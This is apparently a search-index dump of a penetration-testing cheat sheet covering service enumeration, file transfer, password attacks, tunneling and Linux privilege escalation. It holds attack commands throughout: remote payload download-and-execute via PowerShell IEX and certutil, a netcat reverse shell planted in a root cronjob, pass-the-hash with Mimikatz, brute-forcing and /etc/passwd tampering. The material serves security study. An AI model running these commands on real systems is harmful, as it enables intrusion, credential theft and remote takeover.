EXPN","title":"Server Connection"},{"location":"penetration-testing/external-internal/common-services/smtp-25.html#smtp-commands","text":"$ helo admin $ mail from:<> $ rcpt to:<nobody> $ data hades .","title":"SMTP Commands"},{"location":"penetration-testing/external-internal/common-services/smtp-25.html#scanning-vul","text":"$ nmap $ip -p 25 --script = smtp-* $ sudo msfconsole -q -x \"setg RHOSTS $ip ; use auxiliary/scanner/smtp/smtp_enum; run; use auxiliary/scanner/smtp/smtp_relay; run; use auxiliary/scanner/smtp/smtp_version; run; exit\"","title":"Scanning Vul"},{"location":"penetration-testing/external-internal/common-services/smtp-25.html#scripting","text":"Scripting python3 smtp-vrfy.py <username> smtp-vrfy.py #!/usr/bin/python3 import socket import sys if len ( sys . argv ) != 2 : print ( \"Usage: python3 sys.argv[0] <username>\" ) sys . exit ( 0 ) s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) connect = s . connect (( '192.168.11.131' , 25 )) banner = s . recv ( 1024 ) print ( banner ) s . send ( 'VRFY ' + sys . argv [ 1 ] + ' \\r\\n ' ) result = s . recv ( 1024 ) print ( result ) s . close ()","title":"Scripting"},{"location":"penetration-testing/external-internal/common-services/snmp-161.html","text":"snmp 161 Scanning sudo nmap -sU --open -p 161 $ip snmp-check $ip Entire MIB Tree Script https://github.com/dheiland-r7/snmp $ ./snmpbw.pl 10 .10.10.241 public 2 1 SNMP query: 10 .10.10.241 Queue count: 0 SNMP SUCCESS: 10 .10.10.241 Manual File list_community : public private manager onesixtyone -c list_community -i list_ip snmpwalk -c public -v1 -t 10 $ip Options Numbers User Accounts snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25 Running Programs snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2 Open TCP Ports snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3 Installed Software snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2 System Processes snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.1.6.0 Processes Path snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.4 Storage Units snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.2.3.1.4","title":"snmp 161"},{"location":"penetration-testing/external-internal/common-services/snmp-161.html#snmp-161","text":"","title":"snmp 161"},{"location":"penetration-testing/external-internal/common-services/snmp-161.html#scanning","text":"sudo nmap -sU --open -p 161 $ip snmp-check $ip","title":"Scanning"},{"location":"penetration-testing/external-internal/common-services/snmp-161.html#entire-mib-tree","text":"","title":"Entire MIB Tree"},{"location":"penetration-testing/external-internal/common-services/snmp-161.html#script","text":"https://github.com/dheiland-r7/snmp $ ./snmpbw.pl 10 .10.10.241 public 2 1 SNMP query: 10 .10.10.241 Queue count: 0 SNMP SUCCESS: 10 .10.10.241","title":"Script"},{"location":"penetration-testing/external-internal/common-services/snmp-161.html#manual","text":"File list_community : public private manager onesixtyone -c list_community -i list_ip snmpwalk -c public -v1 -t 10 $ip Options Numbers User Accounts snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25 Running Programs snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2 Open TCP Ports snmpwalk -c public -v1 $ip 1.3.6.1.2.1.6.13.1.3 Installed Software snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2 System Processes snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.1.6.0 Processes Path snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.4 Storage Units snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.2.3.1.4","title":"Manual"},{"location":"penetration-testing/external-internal/file-transfer/index.html","text":"File Transfer wget, curl, axel, certutil Server python python3 -m http.server 80 python -m SimpleHTTPServer 80 ruby ruby -run -e httpd . -p 80 php php -S 0 .0.0.0:80 busybox busybox httpd -f -p 80 apache2 sudo systemctl start apache2 Client wget wget -O /tmp/shell http://ip/shell.elf wget <uri> -P /path/to/ curl curl -o /tmp/shell http://ip/shell.elf axel axel -a -n 20 -o /tmp/shell http://ip/shell.elf certutil certutil.exe -urlcache -f http://<url>/shell.exe C: \\\\ inetpub \\\\ wwwroot \\\\ shell.exe Socat Kali machine sudo socat TCP4-LISTEN:443,fork file:shell.exe Windows machine socat TCP4:ip:443 file:shell.exe,create Netcat Kali machine nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe Windows machine nc -nv ip 4444 > wget.exe SCP Command How to Use SCP Command to Securely Transfer Files scp [ OPTION ] [ user@ ] SRC_HOST: ] file1 [ user@ ] DEST_HOST: ] file2 To copy a file from a local to a remote system run the following command: scp -P 2322 file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt To copy a directory from a local to remote system, use the -r option: scp -r /local/directory remote_username@10.10.0.2:/remote/directory scp remote_username@10.10.0.2:/remote/file.txt /local/directory Upload files PHP Server Kali Machine <?php $uploaddir = '/var/www/uploads/' ; $uploadfile = $uploaddir . $_FILES [ 'file' ][ 'name' ]; move_uploaded_file ( $_FILES [ 'file' ][ 'tmp_name' ], $uploadfile ) ?> Client PowerShell ( New-Object System.Net.WebClient ) .UploadFile ( 'http://ip/upload.php' , 'test.txt' ) curl curl -F \"file=@nc.cmd\" http://ip/upload.php FTP Services FTP Server Install sudo apt-get install vsftpd sudo service vsftpd start Anonymous access /etc/vsftpd.conf anonymous_enable=YES Pure-FTPd Client ftp.txt open ip 21 USER hades passwd bin GET nc.exe quit ftp -v -n -s:ftp.txt setup-ftp.sh groupadd ftpgroup useradd -g ftpgroup -d /dev/null -s /etc ftpuser pure-pw useradd hades -u ftpuser -d /ftphome pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ../conf/PureDB 60pdb mkdir -p /ftphome chown -R ftpuser:ftpgroup /ftphome/ systemctl restart pure-ftpd TFTP Server sudo apt update && sudo apt install atftp sudo mkdir /tftp sudo chown nobody: /tftp sudo atftpd --daemon --port 69 /tftp Checking running service $ getent services tftp tftp 69 /udp Client tftp -i ip put test.txt Windows PowerShell Kali machine sudo python3 -m http.server 80 Executing a remote PowerShell script powershell.exe IEX ( New-Object System.Net.WebClient ) .DownloadString ( 'http://ip/revshell.ps1' ) Windows machine ( new-object System.Net.WebClient ) .DownloadFile ( \"http://192.168.11.145/wget.exe\" , \"C:\\Users\\Public\\wget.exe\" ) ps1 script powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 wget.ps1.txt echo $webclient = New-Object System.Net.WebClient >> wget.ps1 echo $url = \"http://ip/nc.exe\" >> wget.ps1 echo $file = \"nc.exe\" >> wget.ps1 echo $webclient .DownloadFile ( $url , $file ) >> wget.ps1 Powercat Bypass policy Set-ExecutionPolicy Unrestricted Download and execute from internet iex ( New-Object System . Net . Webclient ). DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) Local machine . .\\ powercat . ps1 Kali machine sudo nc -lnvp 443 > powercat.ps1 Windows machine powercat -c ip -p 443 -i C: \\U sers \\P ublic \\p owercat.ps1 VBScript command Paste and execute wget.vbs script to the Windows machine. cscript wget.vbs http://<url>/shell.exe shell.exe wget.vbs.txt echo strUrl = WScript.Arguments.Item ( 0 ) > wget.vbs echo StrFile = WScript.Arguments.Item ( 1 ) >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject ( \"WinHttp.WinHttpRequest.5.1\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"WinHttp.WinHttpRequest\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"MSXML2.ServerXMLHTTP\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"Microsoft.XMLHTTP\" ) >> wget.vbs echo http.Open \"GET\" , strURL, False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject ( \"Scripting.FileSystemObject\" ) >> wget.vbs echo Set ts = fs.CreateTextFile ( StrFile, True ) >> wget.vbs echo strData = \"\" >> wget.vbs echo strBuffer = \"\" >> wget.vbs echo For lngCounter = 0 to UBound ( varByteArray ) >> wget.vbs echo ts.Write Chr ( 255 And Ascb ( Midb ( varByteArray,lngCounter + 1 , 1 ))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs Hex String Smaller file upx -9 nc.exe exe2hex -x nc.exe -p nc.cmd SMB Protocol Install git clone https://github.com/SecureAuthCorp/impacket.git cd impacket sudo pip install -r requirements.txt sudo python3 setup.py install SMB Server $ locate whoami.exe /usr/share/windows-resources/binaries/whoami.exe smbserver.py a /usr/share/windows-binaries/ SMB Client \\\\ <ip_server> \\a\\w hoami.exe","title":"File Transfer"},{"location":"penetration-testing/external-internal/file-transfer/index.html#file-transfer","text":"","title":"File Transfer"},{"location":"penetration-testing/external-internal/file-transfer/index.html#wget-curl-axel-certutil","text":"Server python python3 -m http.server 80 python -m SimpleHTTPServer 80 ruby ruby -run -e httpd . -p 80 php php -S 0 .0.0.0:80 busybox busybox httpd -f -p 80 apache2 sudo systemctl start apache2 Client wget wget -O /tmp/shell http://ip/shell.elf wget <uri> -P /path/to/ curl curl -o /tmp/shell http://ip/shell.elf axel axel -a -n 20 -o /tmp/shell http://ip/shell.elf certutil certutil.exe -urlcache -f http://<url>/shell.exe C: \\\\ inetpub \\\\ wwwroot \\\\ shell.exe","title":"wget, curl, axel, certutil"},{"location":"penetration-testing/external-internal/file-transfer/index.html#socat","text":"Kali machine sudo socat TCP4-LISTEN:443,fork file:shell.exe Windows machine socat TCP4:ip:443 file:shell.exe,create","title":"Socat"},{"location":"penetration-testing/external-internal/file-transfer/index.html#netcat","text":"Kali machine nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe Windows machine nc -nv ip 4444 > wget.exe","title":"Netcat"},{"location":"penetration-testing/external-internal/file-transfer/index.html#scp-command","text":"How to Use SCP Command to Securely Transfer Files scp [ OPTION ] [ user@ ] SRC_HOST: ] file1 [ user@ ] DEST_HOST: ] file2 To copy a file from a local to a remote system run the following command: scp -P 2322 file.txt remote_username@10.10.0.2:/remote/directory/newfilename.txt To copy a directory from a local to remote system, use the -r option: scp -r /local/directory remote_username@10.10.0.2:/remote/directory scp remote_username@10.10.0.2:/remote/file.txt /local/directory","title":"SCP Command"},{"location":"penetration-testing/external-internal/file-transfer/index.html#upload-files-php-server","text":"Kali Machine <?php $uploaddir = '/var/www/uploads/' ; $uploadfile = $uploaddir . $_FILES [ 'file' ][ 'name' ]; move_uploaded_file ( $_FILES [ 'file' ][ 'tmp_name' ], $uploadfile ) ?> Client PowerShell ( New-Object System.Net.WebClient ) .UploadFile ( 'http://ip/upload.php' , 'test.txt' ) curl curl -F \"file=@nc.cmd\" http://ip/upload.php","title":"Upload files PHP Server"},{"location":"penetration-testing/external-internal/file-transfer/index.html#ftp-services","text":"","title":"FTP Services"},{"location":"penetration-testing/external-internal/file-transfer/index.html#ftp-server","text":"Install sudo apt-get install vsftpd sudo service vsftpd start Anonymous access /etc/vsftpd.conf anonymous_enable=YES","title":"FTP Server"},{"location":"penetration-testing/external-internal/file-transfer/index.html#pure-ftpd","text":"Client ftp.txt open ip 21 USER hades passwd bin GET nc.exe quit ftp -v -n -s:ftp.txt setup-ftp.sh groupadd ftpgroup useradd -g ftpgroup -d /dev/null -s /etc ftpuser pure-pw useradd hades -u ftpuser -d /ftphome pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ../conf/PureDB 60pdb mkdir -p /ftphome chown -R ftpuser:ftpgroup /ftphome/ systemctl restart pure-ftpd","title":"Pure-FTPd"},{"location":"penetration-testing/external-internal/file-transfer/index.html#tftp","text":"Server sudo apt update && sudo apt install atftp sudo mkdir /tftp sudo chown nobody: /tftp sudo atftpd --daemon --port 69 /tftp Checking running service $ getent services tftp tftp 69 /udp Client tftp -i ip put test.txt","title":"TFTP"},{"location":"penetration-testing/external-internal/file-transfer/index.html#windows","text":"","title":"Windows"},{"location":"penetration-testing/external-internal/file-transfer/index.html#powershell","text":"Kali machine sudo python3 -m http.server 80 Executing a remote PowerShell script powershell.exe IEX ( New-Object System.Net.WebClient ) .DownloadString ( 'http://ip/revshell.ps1' ) Windows machine ( new-object System.Net.WebClient ) .DownloadFile ( \"http://192.168.11.145/wget.exe\" , \"C:\\Users\\Public\\wget.exe\" ) ps1 script powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 wget.ps1.txt echo $webclient = New-Object System.Net.WebClient >> wget.ps1 echo $url = \"http://ip/nc.exe\" >> wget.ps1 echo $file = \"nc.exe\" >> wget.ps1 echo $webclient .DownloadFile ( $url , $file ) >> wget.ps1","title":"PowerShell"},{"location":"penetration-testing/external-internal/file-transfer/index.html#powercat","text":"Bypass policy Set-ExecutionPolicy Unrestricted Download and execute from internet iex ( New-Object System . Net . Webclient ). DownloadString ( 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' ) Local machine . .\\ powercat . ps1 Kali machine sudo nc -lnvp 443 > powercat.ps1 Windows machine powercat -c ip -p 443 -i C: \\U sers \\P ublic \\p owercat.ps1","title":"Powercat"},{"location":"penetration-testing/external-internal/file-transfer/index.html#vbscript","text":"command Paste and execute wget.vbs script to the Windows machine. cscript wget.vbs http://<url>/shell.exe shell.exe wget.vbs.txt echo strUrl = WScript.Arguments.Item ( 0 ) > wget.vbs echo StrFile = WScript.Arguments.Item ( 1 ) >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject ( \"WinHttp.WinHttpRequest.5.1\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"WinHttp.WinHttpRequest\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"MSXML2.ServerXMLHTTP\" ) >> wget.vbs echo If http Is Nothing Then Set http = CreateObject ( \"Microsoft.XMLHTTP\" ) >> wget.vbs echo http.Open \"GET\" , strURL, False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject ( \"Scripting.FileSystemObject\" ) >> wget.vbs echo Set ts = fs.CreateTextFile ( StrFile, True ) >> wget.vbs echo strData = \"\" >> wget.vbs echo strBuffer = \"\" >> wget.vbs echo For lngCounter = 0 to UBound ( varByteArray ) >> wget.vbs echo ts.Write Chr ( 255 And Ascb ( Midb ( varByteArray,lngCounter + 1 , 1 ))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs","title":"VBScript"},{"location":"penetration-testing/external-internal/file-transfer/index.html#hex-string","text":"Smaller file upx -9 nc.exe exe2hex -x nc.exe -p nc.cmd","title":"Hex String"},{"location":"penetration-testing/external-internal/file-transfer/index.html#smb-protocol","text":"Install git clone https://github.com/SecureAuthCorp/impacket.git cd impacket sudo pip install -r requirements.txt sudo python3 setup.py install SMB Server $ locate whoami.exe /usr/share/windows-resources/binaries/whoami.exe smbserver.py a /usr/share/windows-binaries/ SMB Client \\\\ <ip_server> \\a\\w hoami.exe","title":"SMB Protocol"},{"location":"penetration-testing/external-internal/password-attack/index.html","text":"Password Attacks Generate Wordlists /usr/share/wordlists /usr/share/seclists crunch Generation crunch 5 5 -t ,@@^% -o password.txt crunch 10 10 0123456789 -t 2343 @@@@@@ -o passwd.txt Using /usr/share/crunch/charset.lst crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o crunch.txt crunch options Placeholder Character Translation @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including space cewl cewl $url -m 6 -w wordlists.txt john.conf Rules /etc/john/john.conf > [List.Rules:Wordlist] john --wordlist = passwd.txt --rules --stdout > pass-rules.txt Common Services HTTP htaccess Attack How To Set Up Password Authentication with Apache on Ubuntu 14.04 medusa -h 127 .0.0.1 -u kali -P ./pass.txt -M http -m DIR:/ RDP Attack crowbar -b rdp -s 192 .168.11.135/32 -u windows_10_1903_x64 -C ./pass.txt -n 4 SSH Attack hydra -l kali -P ./pass.txt ssh://127.0.0.1 HTTP POST Attack hydra -l admin -P ./pass.txt 192 .168.11.135 http-form-post \"/admin.php:user=admin&pass=^PASS^:INVALID CREDENTIALS\" -vV -f Leveraging Password Hashes Retrieving Password Hashes How to identify hash types Generate password for new user openssl passwd -1 -salt hades leecybersec > hash.txt hashid -m hash.txt john --wordlist = ./pass.txt hash.txt Passing the Hash in Windows Intro to Windows hashes Mimikatz.exe privilege::debug token::elevate lsadump::sam Pass-The-Hash Using smbmap List directory at folder Desktop smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' -r 'Users\\windows_10_1903_x64\\Desktop' Download file 41542.c in Windows 10 smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' --download 'Users\\windows_10_1903_x64\\Desktop\\41542.c' pth-winexe pth-winexe -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd pth-wmis pth-wmis -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd xfreerdp xfreerdp /v:192.168.11.135 /u:windows_10_1903_x64 /pth:68bdacb06923faed9dc32661308f594e wmiexec.py wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e windows_10_1903_x64@192.168.11.135 Password Cracking john --wordlist = ./pass.txt hash.txt unshadow passwd shadow > hash john --rules --wordlist = ./pass.txt hash https://hashcat.net","title":"Password Attack"},{"location":"penetration-testing/external-internal/password-attack/index.html#password-attacks","text":"","title":"Password Attacks"},{"location":"penetration-testing/external-internal/password-attack/index.html#generate-wordlists","text":"/usr/share/wordlists /usr/share/seclists","title":"Generate Wordlists"},{"location":"penetration-testing/external-internal/password-attack/index.html#crunch","text":"Generation crunch 5 5 -t ,@@^% -o password.txt crunch 10 10 0123456789 -t 2343 @@@@@@ -o passwd.txt Using /usr/share/crunch/charset.lst crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o crunch.txt crunch options Placeholder Character Translation @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including space","title":"crunch"},{"location":"penetration-testing/external-internal/password-attack/index.html#cewl","text":"cewl $url -m 6 -w wordlists.txt","title":"cewl"},{"location":"penetration-testing/external-internal/password-attack/index.html#johnconf-rules","text":"/etc/john/john.conf > [List.Rules:Wordlist] john --wordlist = passwd.txt --rules --stdout > pass-rules.txt","title":"john.conf Rules"},{"location":"penetration-testing/external-internal/password-attack/index.html#common-services","text":"","title":"Common Services"},{"location":"penetration-testing/external-internal/password-attack/index.html#http-htaccess-attack","text":"How To Set Up Password Authentication with Apache on Ubuntu 14.04 medusa -h 127 .0.0.1 -u kali -P ./pass.txt -M http -m DIR:/","title":"HTTP htaccess Attack"},{"location":"penetration-testing/external-internal/password-attack/index.html#rdp-attack","text":"crowbar -b rdp -s 192 .168.11.135/32 -u windows_10_1903_x64 -C ./pass.txt -n 4","title":"RDP Attack"},{"location":"penetration-testing/external-internal/password-attack/index.html#ssh-attack","text":"hydra -l kali -P ./pass.txt ssh://127.0.0.1","title":"SSH Attack"},{"location":"penetration-testing/external-internal/password-attack/index.html#http-post-attack","text":"hydra -l admin -P ./pass.txt 192 .168.11.135 http-form-post \"/admin.php:user=admin&pass=^PASS^:INVALID CREDENTIALS\" -vV -f","title":"HTTP POST Attack"},{"location":"penetration-testing/external-internal/password-attack/index.html#leveraging-password-hashes","text":"","title":"Leveraging Password Hashes"},{"location":"penetration-testing/external-internal/password-attack/index.html#retrieving-password-hashes","text":"How to identify hash types Generate password for new user openssl passwd -1 -salt hades leecybersec > hash.txt hashid -m hash.txt john --wordlist = ./pass.txt hash.txt","title":"Retrieving Password Hashes"},{"location":"penetration-testing/external-internal/password-attack/index.html#passing-the-hash-in-windows","text":"Intro to Windows hashes Mimikatz.exe privilege::debug token::elevate lsadump::sam Pass-The-Hash Using smbmap List directory at folder Desktop smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' -r 'Users\\windows_10_1903_x64\\Desktop' Download file 41542.c in Windows 10 smbmap -H 192 .168.11.135 -u windows_10_1903_x64 -p 'aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e' --download 'Users\\windows_10_1903_x64\\Desktop\\41542.c' pth-winexe pth-winexe -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd pth-wmis pth-wmis -U windows_10_1903_x64%aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e //192.168.11.135 cmd xfreerdp xfreerdp /v:192.168.11.135 /u:windows_10_1903_x64 /pth:68bdacb06923faed9dc32661308f594e wmiexec.py wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:68bdacb06923faed9dc32661308f594e windows_10_1903_x64@192.168.11.135","title":"Passing the Hash in Windows"},{"location":"penetration-testing/external-internal/password-attack/index.html#password-cracking","text":"john --wordlist = ./pass.txt hash.txt unshadow passwd shadow > hash john --rules --wordlist = ./pass.txt hash https://hashcat.net","title":"Password Cracking"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html","text":"Port Redirection & Tunneling Port Redirection RINETD nano /etc/rinetd.conf Add forword from kali linux port 80 to ip port 80. # bindadress bindport connectaddress connectport 0.0.0.0 80 192.168.11.1 80 Restart RINETD service sudo service rinetd restart Checking running service at port 80 ss -antp | grep 80 SSH Tunneling Local Forwarding ssh -N -L [ bind_address: ] port:host:hostport [ username@address ] -N Don't need to execute code -L Local forward 0.0.0.0:80 Bind port 80 at Kali Machine 10.10.10.9:80 Forward traffic to target IP hades@192.168.11.133 Compromised machine sudo ssh -N -L 0 .0.0.0:9001:10.10.10.10:8080 hades@192.168.11.133 -i ./.ssh/id_rsa Remote Forwarding ssh -N -R [ bind_address: ] port:host:hostport [ username@address ] ssh -N -R 0 .0.0.0:9001:10.10.10.10:80 kali@myip -i /home/hades/.ssh/kali-idrsa Dynamic Forwarding ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address> ssh -N -D 127 .0.0.1:9001 hades@192.168.11.135 -i .ssh/id_rsa /etc/proxychains.conf socks4 127.0.0.1 9001 Using proxychains to use the proxy proxychains smbclient -L 192 .168.35.129 sudo proxychains nmap --top-ports = 5 -Pn -sT 192 .168.35.129 Plink.exe plink.exe -ssh -l user -pw passwd -R 0 .0.0.0:9001:needed-access-ip:12345 myip Answer command trick using echo cmd.exe /c echo y | plink.exe -ssh -l user -pw passwd -R 0.0.0.0:9001:needed-access-ip:12345 myip NetSH netsh interface portproxy add v4tov4 listenport = 9001 listenaddress = 0 .0.0.0 connectport = 12345 connectaddress = 192 .168.11.1 netstat -anp TCP | find \"9001\" Adding a firewall rule to allow inbound connections on port 9001 netsh advfirewall firewall add rule name = \"forward_port_rule\" protocol = TCP dir = in localip = 192 .168.11.135 localport = 9001 action = allow HTTPTunnel-ing Redirect traffic of RDP at 192.168.11.135 to local at port 8888 ssh -L 0 .0.0.0:8888:192.168.11.135:3389 hades@127.0.0.1 ss -antp | grep \"8888\" Redirect all traffic to http protocol. hts --forward-port localhost:8888 1234 hts --forward-port 192 .168.35.129:3389 1234 ps aux | grep hts At Kali machine, redirect RDP protocol to http protocol htc --forward-port 8080 192 .168.11.133:1234","title":"Redirec & Tunnel"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#port-redirection-tunneling","text":"","title":"Port Redirection &amp; Tunneling"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#port-redirection","text":"","title":"Port Redirection"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#rinetd","text":"nano /etc/rinetd.conf Add forword from kali linux port 80 to ip port 80. # bindadress bindport connectaddress connectport 0.0.0.0 80 192.168.11.1 80 Restart RINETD service sudo service rinetd restart Checking running service at port 80 ss -antp | grep 80","title":"RINETD"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#ssh-tunneling","text":"","title":"SSH Tunneling"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#local-forwarding","text":"ssh -N -L [ bind_address: ] port:host:hostport [ username@address ] -N Don't need to execute code -L Local forward 0.0.0.0:80 Bind port 80 at Kali Machine 10.10.10.9:80 Forward traffic to target IP hades@192.168.11.133 Compromised machine sudo ssh -N -L 0 .0.0.0:9001:10.10.10.10:8080 hades@192.168.11.133 -i ./.ssh/id_rsa","title":"Local Forwarding"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#remote-forwarding","text":"ssh -N -R [ bind_address: ] port:host:hostport [ username@address ] ssh -N -R 0 .0.0.0:9001:10.10.10.10:80 kali@myip -i /home/hades/.ssh/kali-idrsa","title":"Remote Forwarding"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#dynamic-forwarding","text":"ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address> ssh -N -D 127 .0.0.1:9001 hades@192.168.11.135 -i .ssh/id_rsa /etc/proxychains.conf socks4 127.0.0.1 9001 Using proxychains to use the proxy proxychains smbclient -L 192 .168.35.129 sudo proxychains nmap --top-ports = 5 -Pn -sT 192 .168.35.129","title":"Dynamic Forwarding"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#plinkexe","text":"plink.exe -ssh -l user -pw passwd -R 0 .0.0.0:9001:needed-access-ip:12345 myip Answer command trick using echo cmd.exe /c echo y | plink.exe -ssh -l user -pw passwd -R 0.0.0.0:9001:needed-access-ip:12345 myip","title":"Plink.exe"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#netsh","text":"netsh interface portproxy add v4tov4 listenport = 9001 listenaddress = 0 .0.0.0 connectport = 12345 connectaddress = 192 .168.11.1 netstat -anp TCP | find \"9001\" Adding a firewall rule to allow inbound connections on port 9001 netsh advfirewall firewall add rule name = \"forward_port_rule\" protocol = TCP dir = in localip = 192 .168.11.135 localport = 9001 action = allow","title":"NetSH"},{"location":"penetration-testing/external-internal/port-redirection-tunneling/index.html#httptunnel-ing","text":"Redirect traffic of RDP at 192.168.11.135 to local at port 8888 ssh -L 0 .0.0.0:8888:192.168.11.135:3389 hades@127.0.0.1 ss -antp | grep \"8888\" Redirect all traffic to http protocol. hts --forward-port localhost:8888 1234 hts --forward-port 192 .168.35.129:3389 1234 ps aux | grep hts At Kali machine, redirect RDP protocol to http protocol htc --forward-port 8080 192 .168.11.133:1234","title":"HTTPTunnel-ing"},{"location":"penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html","text":"Linux Privilege Escalation Insecure File Permissions Cronjob file Cronjob file check.sh overwrite grep \"CRON\" /var/log/* 2 >/dev/null File check.sh running as root every 1 minute. ls -l check.sh Can change file check.sh with user permission. echo \"rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f\" >> check.sh File /etc/passwd File /etc/passwd can be modify by user permission. ls -l /etc/passwd -rw-rw-rw- 1 root root <snip> /etc/passwd Remove x in the file means root requires no password anymore, sed 's/root:x/root:/' /etc/passwd > /etc/passwd Go to root su Generate password for new user openssl passwd -1 -salt hades leecybersec echo toor: $1$hades$KKCtexC .plAyjcJkX7War0:0:0:root:/root:/bin/bash >> /etc/passwd https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation Check sudo access $ sudo -l [ sudo ] password for Hades: Matching Defaults entries for pentesterlab on 7358cafc3ebe: secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User Hades may run the following commands: ( victim ) /bin/bash Mix cp/chown and chmod https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial/ https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/ sudo -l Matching Defaults entries for Hades: secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin User Hades may run the following commands: ( victim ) /bin/chmod, /bin/cp Checking docker container root@315d7648a173:/# ls -lah <snip> -rwxr-xr-x 1 root root 0 Jun 9 13 :01 .dockerenv mkdir -p /mnt/hola mount /dev/sda1 /mnt/hola mount /dev/sda2 /mnt/hola mount /dev/sda3 /mnt/hola Kernel Exploit OS Version & Architecture cat /etc/issue ; uname -r ; arch Compile exploit in C/C++ Compile file $ gcc -m32 Size.c -o x86-S $ ./x86-S Size = 4 $ gcc Size.c -o x64-S $ ./x64-S Size = 8 File Size.c #include <stdio.h> int main () { printf ( \"Size = %lu\" , sizeof ( size_t )); } For Example Full-Nelson.c Exploit Kernel More Reference history, bashrc, backup find / -name *history* 2 